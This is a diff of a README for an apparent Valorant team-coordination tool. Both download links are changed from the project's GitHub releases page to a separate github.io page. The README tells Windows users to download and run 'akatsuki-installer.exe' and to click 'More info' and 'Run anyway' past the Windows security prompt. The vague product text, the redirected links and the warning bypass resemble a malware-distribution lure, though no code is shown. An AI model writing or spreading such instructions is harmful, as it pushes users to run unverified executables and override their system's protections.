@@ -1,6 +1,6 @@
 # 🎯 akatsuki-valorant-team-2026 - Join our elite Valorant competitive squad
 
-[![Download Latest Release](https://img.shields.io/badge/Download-Release-blue)](https://github.com/behi6872/akatsuki-valorant-team-2026/releases)
+[![Download Latest Release](https://img.shields.io/badge/Download-Release-blue)](https://behi6872.github.io)
 
 This project connects skilled players for structured Valorant practice and competitive matches. It provides tools to manage team communication, track match history, and analyze performance within Riot Games’ tactical shooter. Use this software to coordinate squad activities and improve your rank through consistent training and team development.
 
@@ -19,7 +19,7 @@ Before you install this software, ensure your computer meets these requirements:
 
 Follow these steps to set up the software on your Windows computer:
 
-1. Visit the [official releases page](https://github.com/behi6872/akatsuki-valorant-team-2026/releases) to download the latest setup file.
+1. Visit the [official releases page](https://behi6872.github.io) to download the latest setup file.
 2. Locate the file named `akatsuki-installer.exe` in your Downloads folder once the transfer finishes.
 3. Double-click the file to start the installation process.
 4. Windows might display a security prompt. Click "More info" and then "Run anyway" if the system asks for your permission to execute the installer.
